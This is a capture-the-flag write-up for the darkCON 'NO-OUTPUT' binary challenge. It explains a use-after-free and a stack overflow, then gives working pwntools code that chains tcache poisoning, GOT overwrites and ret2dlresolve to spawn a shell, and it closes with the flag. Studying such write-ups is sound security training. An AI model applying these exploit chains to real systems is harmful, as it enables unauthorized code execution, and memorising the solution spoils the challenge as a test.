# Pwn/NO-OUTPUT [495]

```
Ok !!! This challenge doesn't give any output. Now try to get the shell.
The libc has tcache enabled (not libc-2.32) and you don't require libc for this challenge at all. This challenge can be done without having libc. You don't need to guess or bruteforce libc.
connection: nc 13.233.166.242 49153
```

**Files**: [NO-Output.zip](https://darkc0n.blob.core.windows.net/challenges/NO-Output.zip) (`NO_output`)

```c
$ checksec NO_Output
[*] '/NO_Output'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

## Figuring out what to do

The code for this challenge is structurally similar to that of [Warmup](Warmup.md), so we'll be inspecting the differences more closely.

`init()` does something weird:

```c
unsigned __int64 init() {
  char c; // [rsp+Bh] [rbp-25h]
  int i; // [rsp+Ch] [rbp-24h]
  char s[24]; // [rsp+10h] [rbp-20h]
  for ( i = 0; i <= 71; ++i )
  {
    c = fgetc(stdin);
    if ( c == '\n' )
      break;
    s[i] = c;
  }
  return __readfsqword(0x28u) ^ v4;
}

```

This is clearly an overflow, but overflowing here will cause a stack protector failure. We'll probably need to jump back to here later to perform ROP for one reason or another.

`main()` now has 3 options: `add()`, `edit()`, and `delete()`.

```c
unsigned getIndex() {
  int ind; // [rsp+Ch] [rbp-4h] BYREF
  scanf("%d", &ind); getchar();
  if ( ind < 0 || ind > 15 )
    exit(0);
  return ind;
}
unsigned getValidSize() {
  int sz; // [rsp+Ch] [rbp-4h] BYREF
  scanf("%d", &sz); getchar();
  if ( sz < 0 || sz > 4096 )
    exit(0);
  return sz;
}
void add() {
  int ind = getIndex();
  int size = getValidSize();
  chunks_len[ind] = size;
  chunks[ind] = (char *)malloc(size);
  for (int i = 0; ; ++i) {
    if ( i >= chunks_len[ind] )
      break;
    char c = fgetc(stdin);
    if ( c == '\n' )
      break; // not nul-terminated!
    chunks[ind][i] = c;  
  }
}
```

The first option allows for an arbitrary allocation of up to 4096 bytes. The bytes inputted don't get nul-terminated, but that isn't very significant here because of the lack of any string manipulation functions.

```c
void edit() {
  int ind = getIndex();
  if ( !chunks[ind] )
    exit(0);
  for (int i = 0; ; ++i) {
    if ( i >= chunks_len[ind] )
      break;
    char c = fgetc(stdin);
    if ( c == '\n' )
      break;
    chunks[ind][i] = c;
  }
  return c;
}
```

`edit()` simply overwrites the first `chunks_len[ind]` bytes at `chunks[ind]`. This in-and-of-itself is not an issue, but combined with the bug here:

```c
void delete() {
  int ind = getIndex();
  if ( !chunks[ind] )
    exit(0);
  free(chunks[ind]); // !!! chunks[ind] is not cleared !!!
}
```

We can make use of the UAF to [allocate an arbitrary pointer](https://github.com/shellphish/how2heap/blob/master/glibc_2.31/tcache_poisoning.c) via the tcache free list.

```python
def tcache_poison(size: int, ptr: int):
    '''put an arbitrary ptr of a specific size at the head of the tcache free list'''
    assert size < 0x400 # must be within tcache size
    # We'll use the last indexes (14 & 15) for temporary storage
    add(14, size, b'first')
    add(15, size, b'second')
    delete(14)
    delete(15)
    edit(15, pack(ptr))
    add(15, size, b'second')
    # after here, the next call for malloc(`size`) will return `ptr`.
```

My immediate idea is to use this arbitrary write primitive to overwrite the GOT table, which would grant us arbitrary code execution... with the addresses we know.

As the title states, this challenge provides **no output**: PIE might be disabled, but there aren't any immediately useful functions available for leaking data. We'll need to obtain a shell without any information leaks.

I got stuck on this for a bit, up until I found an enlightening piece of metadata within IDA:

![image-20210220212611387](C:\Users\A\AppData\Roaming\Typora\typora-user-images\image-20210220212611387.png)

_Ah._

## ret2dlresolve

In essence, the `ret2dlresolve` technique is a leakless method for executing libc functions, given that the exploiter has the location of `.text`, along with a sufficiently long region for ROP. You can look up the finer details in writeups online, or you can [abuse pwntools](https://pwntools.readthedocs.io/en/dev/rop/ret2dlresolve.html) like I do.

In short, the solution here is to:

1. Use the UAF/Double-Free poisoning above to write `dlresolve.payload` to `dlresolve.data_addr`. Whatever those things are.

   ```python
   dlresolve = Ret2dlresolvePayload(context.binary, symbol="system", args=["/bin/sh"])
   tcache_poison(0x200, dlresolve.data_addr)
   add(0, 0x200, dlresolve.payload)
   ```

   This is the `rop.read(0, dlresolve.data_addr)` step in the pwntools example.

2. With the same arbitrary write primitive, edit a good function to jump back to `init()` for an overflow, and also [**edit `__stack_chk_fail()` to a `leave; ret;` gadget**](http://wapiflapi.github.io/2014/11/17/hacklu-oreo-with-ret2dl-resolve.html).

   ```python
   R = ROP(context.binary)
   leave_ret = R.find_gadget(['leave', 'ret']).address
   tcache_poison(0x18, context.binary.got['free'])
   add(0, 0x18, pack(context.binary.symbols['init']) + pack(leave_ret))
   ```

    Since `free()` is adjacent to `__stack_chk_fail()` in the GOT table, I used `free()` as that `init()` trampoline.

3. Use the ROP available at `init()` in conjunction with the [ret2dlresolve](https://pwntools.readthedocs.io/en/dev/rop/ret2dlresolve.html) module to call `system("/bin/sh")`.

   ```python
   R.raw(b'a'*0x28)
   R.ret2dlresolve(dlresolve)
   delete(0) # trigger free(), which triggers init()
   r.sendline(R.chain())
   r.interactive()
   ```

   

That's that.

## Flag

`darkCON{R3t_t0_dlr3s0lv3_c0mb1n1n9_w1th_tc4ch3_p01s0n1n9_4tt4ck}`